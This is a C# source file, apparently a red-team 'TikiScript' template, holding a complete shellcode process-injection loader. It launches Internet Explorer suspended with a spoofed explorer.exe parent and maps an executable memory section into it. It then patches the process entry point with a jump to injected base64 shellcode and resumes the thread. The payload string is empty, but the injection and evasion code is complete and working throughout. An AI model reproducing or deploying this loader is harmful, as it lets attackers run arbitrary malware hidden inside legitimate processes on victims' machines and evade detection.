using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class TikiScript
{
    public static void Flame()
    {
        string targetProcess = @"C:\\Program Files\\Internet Explorer\\iexplore.exe";
        string encodedShellcode = @"";

        int parentProcessId = PPID.FindExplorer();

        if (parentProcessId == 0)
        {
            Console.WriteLine("[x] Couldn't get Explorer PID");
            Environment.Exit(1);
        }

        var ldr = new Loader();

        try
        {
            ldr.Load(targetProcess, Convert.FromBase64String(encodedShellcode), parentProcessId);
        }
        catch (Exception e)
        {
                Console.WriteLine("[x] Something went wrong! " + e.Message);
        }
    }
}

public class PPID
    {
        public static int FindExplorer()
        {
            int pid;

            Process[] processes = Process.GetProcessesByName("explorer");

            if (processes.Length == 1)
            {
                pid = processes[0].Id;
            }
            else
            {
                pid = 0;
            }

            return pid;

        }
    }

public sealed class Loader
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;

        //someone please implement this for Dom
        public const uint PageExecuteRead = 0x20;

        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("kernel32.dll")]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException("[x] Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        public void SetLocalSection(uint size)
        {
            var vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;
        }

        public void CopyShellcode(byte[] buf)
        {
            var lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        public PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            IntPtr lpValue = IntPtr.Zero;

            try
            {

                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow | EXTENDED_STARTUPINFO_PRESENT;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                if (!CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo))
                    throw new SystemException("[x] Failed to create process!");

                return pInfo;

            }
            finally
            {
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
        }

        const ulong PatchSize = 0x10;

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {

                var p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    var val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    var val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {

            var tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            var patch = BuildEntryPatch(tmp.Key);

            try
            {

                var pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            var tbuf = new byte[0x1000];
            var nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException("Failed!");

            var res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException("[x] Failed to restart thread!");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~Loader()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }

        public void Load(string targetProcess, byte[] shellcode, int parentProcessId)
        {

            var pinf = StartProcess(targetProcess, parentProcessId);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);

            MapAndStart(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public Loader()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000];
        }

    }